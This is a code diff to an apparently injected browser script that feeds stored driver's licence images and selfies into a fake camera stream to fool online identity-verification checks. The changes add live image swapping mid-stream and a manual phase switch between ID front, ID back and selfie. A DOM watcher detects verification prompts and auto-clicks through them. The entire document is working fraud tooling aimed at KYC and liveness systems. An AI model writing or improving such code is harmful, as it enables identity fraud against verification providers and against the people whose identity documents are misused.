@@ -9,23 +9,37 @@ function ssSet(k, v) { try { sessionStorage.setItem(k, v) }      catch(_) {} }
 // ── Image store ───────────────────────────────────────────────────────────────
 ssSet('__idv_phase__', 'id') // always reset to id on page load
 const IDV = {
-  dlFront:  ssGet('__idv_dl_front__'),
-  dlBack:   ssGet('__idv_dl_back__'),
-  selfies:  [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
-  phase:    'id',  // always start with ID — switch to selfie via DOM watcher
-  idStep:   0,
-  camActive: false
+  dlFront:    ssGet('__idv_dl_front__'),
+  dlBack:     ssGet('__idv_dl_back__'),
+  selfies:    [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
+  phase:      'id',  // always start with ID — switch to selfie via DOM watcher
+  idStep:     0,
+  camActive:  false,
+  currentImg: null   // live canvas reference for mid-stream image swap
 }
 
 window.addEventListener('message', ev => {
-  if (ev.source !== window || ev.data?._idv !== 'IDV_SET') return
+  if (ev.source !== window) return
   const d = ev.data
-  if (d.dlFront)         IDV.dlFront  = d.dlFront
-  if (d.dlBack)          IDV.dlBack   = d.dlBack
-  if (d.selfies?.length) IDV.selfies  = d.selfies
-  if (d.phase)           IDV.phase    = d.phase
-  console.log('[IDV] Images received. dlFront=' + !!IDV.dlFront + ' selfies=' + IDV.selfies.length)
-  updateBadge()
+  if (d?._idv === 'IDV_SET') {
+    if (d.dlFront)         IDV.dlFront  = d.dlFront
+    if (d.dlBack)          IDV.dlBack   = d.dlBack
+    if (d.selfies?.length) IDV.selfies  = d.selfies
+    if (d.phase)           IDV.phase    = d.phase
+    console.log('[IDV] Images received. dlFront=' + !!IDV.dlFront + ' selfies=' + IDV.selfies.length)
+    updateBadge()
+  }
+  if (d?._idv === 'IDV_SWITCH') {
+    IDV.phase  = d.phase  ?? IDV.phase
+    IDV.idStep = d.idStep ?? IDV.idStep
+    ssSet('__idv_phase__', IDV.phase)
+    console.log('[IDV] Manual switch → phase=' + IDV.phase + ' idStep=' + IDV.idStep)
+    showToast('⬡ IDV: Switched to ' + (IDV.phase === 'selfie' ? 'Selfie' : IDV.idStep === 1 ? 'ID Back' : 'ID Front'), '#1e3a5f')
+    // Reload the canvas image immediately if camera is active
+    if (IDV.camActive) {
+      loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
+    }
+  }
 })
 
 function pickSrc() {
@@ -115,10 +129,12 @@ async function buildFakeStream(src) {
   canvas.width = W; canvas.height = H
   const ctx = canvas.getContext('2d')
 
-  const baseScale = Math.min(W / img.naturalWidth, H / img.naturalHeight) * 1.08
+  IDV.currentImg = img
   let ox = 0, oy = 0, sc = 1, vx = 0.15, vy = 0.1, vs = 0.0001
 
   function draw() {
+    const ci = IDV.currentImg || img
+    const baseScale = Math.min(W / ci.naturalWidth, H / ci.naturalHeight) * 1.08
     ox += vx; oy += vy; sc += vs
     if (Math.abs(ox) > 8)   vx *= -1
     if (Math.abs(oy) > 5)   vy *= -1
@@ -126,7 +142,7 @@ async function buildFakeStream(src) {
     const s = baseScale * sc
     ctx.fillStyle = '#111'
     ctx.fillRect(0, 0, W, H)
-    ctx.drawImage(img, (W - img.naturalWidth*s)/2 + ox, (H - img.naturalHeight*s)/2 + oy, img.naturalWidth*s, img.naturalHeight*s)
+    ctx.drawImage(ci, (W - ci.naturalWidth*s)/2 + ox, (H - ci.naturalHeight*s)/2 + oy, ci.naturalWidth*s, ci.naturalHeight*s)
     // Vignette
     const g = ctx.createRadialGradient(W/2, H/2, H*.32, W/2, H/2, H*.72)
     g.addColorStop(0, 'rgba(0,0,0,0)'); g.addColorStop(1, 'rgba(0,0,0,0.2)')
@@ -303,11 +319,13 @@ function checkDOM() {
 
   if (IDV.phase === 'id' && IDV.idStep === 0 && BACK_W.some(w => txt.includes(w))) {
     IDV.idStep = 1; console.log('[IDV] → back-of-ID')
+    loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
   }
   if (IDV.phase !== 'selfie' && SELFIE_W.some(w => txt.includes(w))) {
     IDV.phase = 'selfie'; ssSet('__idv_phase__', 'selfie')
     window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'selfie' }, '*')
     console.log('[IDV] → selfie phase')
+    loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
   }
   if (ADVANCE_W.some(w => txt.includes(w))) setTimeout(autoClick, 900)
 }
